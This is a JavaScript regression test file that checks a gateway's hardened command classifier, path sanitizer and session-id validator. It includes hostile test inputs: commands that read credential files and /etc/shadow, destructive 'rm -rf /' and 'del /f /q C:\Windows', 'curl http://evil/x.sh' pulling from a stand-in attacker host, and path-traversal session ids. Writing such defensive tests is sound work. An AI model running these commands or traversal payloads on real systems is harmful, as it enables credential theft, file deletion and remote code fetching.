/**
 * Regression tests for the gateway hardening in
 * patches/0001-gateway-p0-security-and-crash-fixes.patch.
 *
 * These tests AUTO-SKIP until that patch is applied. The skip is deliberate:
 * dsh-server-plugin/lib/ is junction-linked into the running dsh web process
 * (~/.dsh/profiles/web/node_modules/dsh-mobile-bridge), so the hardened code
 * cannot simply be edited in place — it has to be applied at a moment the user
 * chooses. Detecting the new exports keeps `npm test` green today and turns the
 * assertions on automatically the moment the patch lands.
 *
 * Every bypass pinned here was VERIFIED reachable against the unpatched code by
 * diffing live-vs-patched behaviour; see patches/README.md for the measured
 * before/after table (15 bypasses blocked, 0 remaining, 0 legitimate
 * read-only commands broken, all 2321 real session ids still accepted).
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import * as core from '../../dsh-server-plugin/lib/core.mjs';

const HARDENED = typeof core.assertSessionId === 'function'
  && typeof core.classifyCommand === 'function';

const SKIP_MSG = HARDENED
  ? false
  : 'needs patches/0001-gateway-p0-security-and-crash-fixes.patch (see patches/README.md)';

describe('security hardening: auto-read command classifier', { skip: SKIP_MSG }, () => {
  /**
   * The shipped default policy is auto-read, and under it the approval path
   * auto-approves whatever isCommandReadOnly() accepts. Each of these was
   * measured as ACCEPTED by the unpatched classifier.
   */
  const MUST_BLOCK = [
    // Credential theft: `cat <absolute path>` has no shell metacharacter, so the
    // old prefix whitelist waved it through and the output was broadcast to every
    // connected client. Holding the engine HMAC key means being able to forge a
    // dsh-auth-* cookie and talk to engine port 3080 directly — the gateway's own
    // auth layer is not in that path.
    ['cat C:/Users/Administrator/.dsh/.credentials.yaml', 'pwsh'],
    ['cat C:\\Users\\Administrator\\.dsh\\.credentials.yaml', 'pwsh'],
    ['cat .env', 'pwsh'],
    ['cat /etc/shadow', 'pwsh'],
    ['cat android/key.properties', 'pwsh'],
    ['cat release.jks', 'pwsh'],
    // Tool-name spoofing: the old first statement was
    // `if (READ_ONLY_TOOLS.includes(toolName)) return true`, and toolName comes
    // from the request, so it was never a trust anchor.
    ['rm -rf /', 'read_file'],
    ['del /f /q C:\\Windows', 'read_file'],
    ['anything at all', 'read_file'],
    ['curl http://evil/x.sh', 'list_dir'],
    // Writers disguised as readers.
    ['find . -delete', 'pwsh'],
    ['git log --output=/tmp/x', 'git'],
    ['git log -o /tmp/x', 'git'],
    ['echo hello', 'pwsh'],
    ['git push origin main', 'git'],
    ['npm publish', 'pwsh']
  ];

  for (const [cmd, tool] of MUST_BLOCK) {
    it(`refuses to auto-approve: ${cmd}`, () => {
      assert.equal(
        core.isCommandReadOnly(cmd, tool),
        false,
        `"${cmd}" (tool=${tool}) must not be auto-approved under auto-read`
      );
      const why = core.classifyCommand(cmd, tool);
      assert.equal(why.readOnly, false);
      assert.ok(why.why, 'a denial must carry a reason for the audit log');
    });
  }

  /**
   * Tightening a whitelist is only safe if it does not start prompting for
   * ordinary reads. All of these were measured as ACCEPTED before and must stay
   * accepted, otherwise auto-read becomes unusable and users will switch the
   * policy to danger-full-access to stop the noise.
   */
  const MUST_ALLOW = [
    ['ls -la', 'pwsh'],
    ['dir', 'pwsh'],
    ['cat README.md', 'pwsh'],
    ['head -n 20 notes.txt', 'pwsh'],
    ['tail -n 50 app.log', 'pwsh'],
    ['grep -r TODO src', 'pwsh'],
    ['wc -l main.dart', 'pwsh'],
    ['git status', 'git'],
    ['git status --porcelain', 'git'],
    ['git log', 'git'],
    ['git log --oneline -20', 'git'],
    ['git diff', 'git'],
    ['pwd', 'pwsh'],
    ['which node', 'pwsh'],
    // What read_file actually receives: a bare path with no verb.
    ['lib/main.dart', 'read_file'],
    ['src/services/dsh_service.dart', 'view_file'],
    ['', 'read_file'],
    ['', 'search_web']
  ];

  for (const [cmd, tool] of MUST_ALLOW) {
    it(`still auto-approves the legitimate read: ${cmd || '(bare tool, no command)'}`, () => {
      assert.equal(
        core.isCommandReadOnly(cmd, tool),
        true,
        `"${cmd}" (tool=${tool}) is an ordinary read and must stay auto-approved`
      );
    });
  }

  it('find and echo are no longer on the read-only prefix whitelist', () => {
    assert.ok(!core.READ_ONLY_PREFIXES.includes('find'), 'find supports -delete and -exec');
    assert.ok(!core.READ_ONLY_PREFIXES.includes('echo'), 'echo reads nothing');
  });

  it('exposes the sensitive-path patterns it blocks on', () => {
    assert.ok(Array.isArray(core.SENSITIVE_PATH_PATTERNS));
    assert.ok(core.SENSITIVE_PATH_PATTERNS.length >= 10);
  });
});

describe('security hardening: path sanitizer fails closed', { skip: SKIP_MSG }, () => {
  const WS = path.join(os.tmpdir(), 'dsh-hardening-ws');

  it('rejects everything when the workspace registry is empty', () => {
    // getRegisteredWorkspaces() reads the engine's workspace table over RPC and
    // legitimately returns [] during startup, after an engine reconnect, or on
    // any RPC failure. The old guard was `if (registeredPaths.length > 0)`, so in
    // exactly those windows layer 2 was skipped and any absolute path on the host
    // was accepted.
    const sanitize = core.createPathSanitizer({ getRegisteredWorkspaces: () => [] });
    const r = sanitize(WS, 'MEMORY.MD');
    assert.equal(r.status, 403);
    assert.match(r.error, /no registered workspaces/i);
  });

  it('rejects control characters embedded in workspacePath', () => {
    const sanitize = core.createPathSanitizer({ getRegisteredWorkspaces: () => [{ path: WS }] });
    const r = sanitize(`${WS}\u0000\\evil`, 'a.md');
    assert.equal(r.status, 403);
  });

  it('rejects Windows extended-length and device path prefixes', () => {
    const sanitize = core.createPathSanitizer({ getRegisteredWorkspaces: () => [{ path: WS }] });
    for (const bad of ['\\\\?\\C:\\Windows\\system32', '\\\\.\\pipe\\x']) {
      const r = sanitize(bad, 'a.md');
      assert.equal(r.status, 403, `${bad} must be rejected`);
    }
  });

  it('still accepts a normal file inside a registered workspace', () => {
    const sanitize = core.createPathSanitizer({ getRegisteredWorkspaces: () => [{ path: WS }] });
    const r = sanitize(WS, 'MEMORY.MD');
    assert.ok(!r.error, `expected success, got ${r.error}`);
    assert.equal(r.targetFile, path.join(WS, 'MEMORY.MD'));
  });
});

describe('security hardening: session id validation', { skip: SKIP_MSG }, () => {
  it('rejects traversal payloads that used to reach fs.unlinkSync', () => {
    // deleteSession() built `${clean}.json` from raw caller input and passed it
    // to path.join(cacheDir, name) then fs.unlinkSync, so
    // POST /api/mobile/sessions/delete {"sessionId":"../../../../storages/workspace"}
    // deleted an arbitrary .json file — including the workspace table and the
    // gateway's own mobile-bridge/config.json.
    for (const evil of [
      '../../../../storages/workspace',
      '../../../../mobile-bridge/config',
      '..\\..\\..\\..\\windows\\system32\\config\\x',
      'session-../../../etc/passwd',
      'a'.repeat(300)
    ]) {
      const r = core.assertSessionId(evil);
      assert.equal(r.ok, false, `${JSON.stringify(evil)} must be rejected`);
    }
  });

  it('accepts every real session id shape', () => {
    for (const good of ['session-a', 'abc', 'session-5069396e-55b9-4217-9d4e-1c2b6b3bc0d3', '5069396e-55b9-4217-9d4e-1c2b6b3bc0d3']) {
      const r = core.assertSessionId(good);
      assert.equal(r.ok, true, `${good} must be accepted`);
    }
  });

  it('deleteSession refuses a traversal id instead of touching the filesystem', () => {
    const HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-harden-del-'));
    try {
      fs.mkdirSync(path.join(HOME, 'storages', 'session_projcache', 'sessions'), { recursive: true });
      fs.writeFileSync(path.join(HOME, 'storages', 'workspace.json'), '{"global":{},"tables":{"workspaces":{}}}', 'utf8');
      const victim = path.join(HOME, 'storages', 'VICTIM.json');
      fs.writeFileSync(victim, '{"important":true}', 'utf8');

      const r = core.deleteSession({ home: HOME, sessionId: '../VICTIM' });
      assert.equal(r.ok, false);
      assert.match(r.error, /Invalid sessionId/);
      assert.ok(fs.existsSync(victim), 'a file outside the cache dir must survive');
    } finally {
      fs.rmSync(HOME, { recursive: true, force: true });
    }
  });

  it('caps global.archivedSessionIds instead of growing without bound', async () => {
    // Archiving is how this bridge deletes, and the list was appended to forever
    // (1350 entries measured). workspace.json is parsed synchronously inside
    // getWorkspacesData(), which runs per request, so an unbounded list taxes
    // every API call.
    const HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-harden-cap-'));
    const wsPath = path.join(HOME, 'storages', 'workspace.json');
    const prevEnv = process.env.DSH_MAX_ARCHIVED_SESSIONS;
    try {
      fs.mkdirSync(path.dirname(wsPath), { recursive: true });
      fs.writeFileSync(wsPath, JSON.stringify({
        global: { archivedSessionIds: Array.from({ length: 25 }, (_, i) => `session-old${i}`) },
        tables: { workspaces: {} }
      }), 'utf8');

      // The cap is read at module load, so the env var must be set before a
      // cache-busted re-import.
      process.env.DSH_MAX_ARCHIVED_SESSIONS = '10';
      const fresh = await import(`../../dsh-server-plugin/lib/core.mjs?cap=${Date.now()}`);

      const r = fresh.deleteSession({ home: HOME, sessionId: 'session-new' });
      const after = JSON.parse(fs.readFileSync(wsPath, 'utf8')).global.archivedSessionIds;
      assert.ok(after.length <= 10, `expected <= 10 archived ids, got ${after.length}`);
      assert.equal(r.evicted, 16);
      assert.ok(after.includes('session-new'), 'the newest id must survive eviction');
    } finally {
      if (prevEnv === undefined) delete process.env.DSH_MAX_ARCHIVED_SESSIONS;
      else process.env.DSH_MAX_ARCHIVED_SESSIONS = prevEnv;
      // Runs only after the awaits above have settled — an earlier version of
      // this test deleted HOME from a finally while the import was still pending.
      fs.rmSync(HOME, { recursive: true, force: true });
    }
  });
});
